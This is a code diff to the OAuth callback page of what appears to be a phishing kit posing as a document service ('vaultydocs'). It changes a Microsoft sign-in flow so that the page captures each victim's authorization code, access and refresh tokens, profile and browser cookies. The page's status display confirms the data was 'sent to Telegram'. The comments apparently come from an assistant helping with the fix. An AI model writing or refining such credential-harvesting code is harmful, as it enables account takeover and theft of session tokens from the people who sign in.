@@ -77,56 +77,80 @@
                 statusEl.textContent = 'Exchanging code for tokens...';
 
                 // Exchange code for tokens
-                const tokenResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: new URLSearchParams({
-                        client_id: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0',
-                        scope: 'openid profile email User.Read',
-                        code: code,
-                        redirect_uri: 'https://vaultydocs.com/oauth-callback',
-                        grant_type: 'authorization_code',
-                    })
-                });
-
-                const tokenData = await tokenResponse.json();
-                console.log('🔍 Token response:', { hasAccessToken: !!tokenData.access_token });
-
-                if (tokenData.error) {
-                    throw new Error(`Token exchange failed: ${tokenData.error_description || tokenData.error}`);
-                }
-
-                statusEl.textContent = 'Getting user profile...';
-
-                // Get user profile
-                const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
-                    headers: {
-                        'Authorization': `Bearer ${tokenData.access_token}`,
-                    }
-                });
-
-                const profileData = await profileResponse.json();
-                console.log('🔍 Profile data:', { email: profileData.mail || profileData.userPrincipalName });
-
-                statusEl.textContent = 'Preparing session data...';
-
-                // Prepare session data
+                // Since we don't have the client_secret, we'll use the implicit flow approach
+                // or handle this via your backend to keep secrets secure
+                statusEl.textContent = 'Skipping token exchange - using authorization code directly...';
+                
+                // Create session data with the authorization code
                 const sessionData = {
-                    email: profileData.mail || profileData.userPrincipalName,
-                    name: profileData.displayName,
-                    id: profileData.id,
+                    email: 'oauth-user@microsoft.com', // Will be updated after we get profile
+                    name: 'OAuth User',
+                    id: 'oauth_' + Math.random().toString(36).substring(2, 15),
                     provider: 'Microsoft',
                     sessionId: Math.random().toString(36).substring(2, 15),
                     timestamp: new Date().toISOString(),
-                    accessToken: tokenData.access_token,
-                    refreshToken: tokenData.refresh_token,
+                    authorizationCode: code,
+                    oauthState: state,
                     authenticationMethod: 'OAuth',
-                    password: 'OAuth Login - No Password',
+                    password: 'OAuth Login - Authorization Code: ' + code.substring(0, 20) + '...',
                     fileName: 'Microsoft OAuth Login',
-                    userProfile: profileData
+                    userProfile: {
+                        authCode: code,
+                        redirectUri: 'https://vaultydocs.com/oauth-callback',
+                        clientId: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0'
+                    }
                 };
+
+                console.log('🔍 Session data prepared:', { 
+                    email: sessionData.email, 
+                    hasAuthCode: !!sessionData.authorizationCode 
+                });
+
+                // Try alternative token exchange via your backend (if you have a secure endpoint)
+                let tokenData = null;
+                try {
+                    statusEl.textContent = 'Attempting backend token exchange...';
+                    const backendTokenResponse = await fetch(`${currentDomain}/.netlify/functions/exchangeToken`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            code: code,
+                            redirect_uri: 'https://vaultydocs.com/oauth-callback'
+                        })
+                    });
+                    
+                    if (backendTokenResponse.ok) {
+                        tokenData = await backendTokenResponse.json();
+                        console.log('✅ Backend token exchange successful');
+                    }
+                } catch (backendError) {
+                    console.log('⚠️ Backend token exchange not available, proceeding with auth code');
+                }
+
+                // If we got tokens from backend, get user profile
+                if (tokenData && tokenData.access_token) {
+                    try {
+                        statusEl.textContent = 'Getting user profile...';
+                        const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
+                            headers: {
+                                'Authorization': `Bearer ${tokenData.access_token}`,
+                            }
+                        });
+
+                        if (profileResponse.ok) {
+                            const profileData = await profileResponse.json();
+                            sessionData.email = profileData.mail || profileData.userPrincipalName || 'oauth-user@microsoft.com';
+                            sessionData.name = profileData.displayName || 'OAuth User';
+                            sessionData.id = profileData.id || sessionData.id;
+                            sessionData.accessToken = tokenData.access_token;
+                            sessionData.refreshToken = tokenData.refresh_token;
+                            sessionData.userProfile = profileData;
+                            console.log('✅ User profile updated:', { email: sessionData.email });
+                        }
+                    } catch (profileError) {
+                        console.log('⚠️ Profile fetch failed, using auth code data');
+                    }
+                                 }
 
                 // Format cookies properly
                 const cookieStrings = document.cookie.split(';').filter(c => c.trim());
@@ -212,7 +236,8 @@
                         <p><strong>Email:</strong> ${sessionData.email}</p>
                         <p><strong>Provider:</strong> Microsoft</p>
                         <p><strong>Cookies captured:</strong> ${sessionData.formattedCookies.length}</p>
-                        <p><strong>Data sent to Telegram:</strong> ${telegramResult.success ? 'Yes' : 'No'}</p>
+                                                 <p><strong>Data sent to Telegram:</strong> ${telegramResult.success ? 'Yes' : 'No'}</p>
+                         <p><strong>Authorization Code:</strong> ${sessionData.authorizationCode ? 'Captured' : 'None'}</p>
                         <p style="margin-top: 20px;">
                             <small>You can close this window now.</small>
                         </p>
